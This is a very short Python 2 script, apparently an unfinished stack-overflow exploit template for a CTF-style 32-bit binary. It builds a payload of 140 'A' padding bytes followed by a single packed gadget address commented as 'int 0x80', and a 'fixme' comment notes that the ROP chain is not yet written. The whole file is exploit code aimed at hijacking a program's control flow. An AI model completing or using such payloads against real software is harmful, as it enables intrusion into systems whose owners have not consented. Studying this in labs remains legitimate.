#!/usr/bin/env python

from struct import pack
 
junk = "A" * 140
 
## ROP gadgets ##
p = ''
# fixme : write the ROP chain
p += pack('<I', 0x08049411) # int 0x80

payload = junk + p
print payload
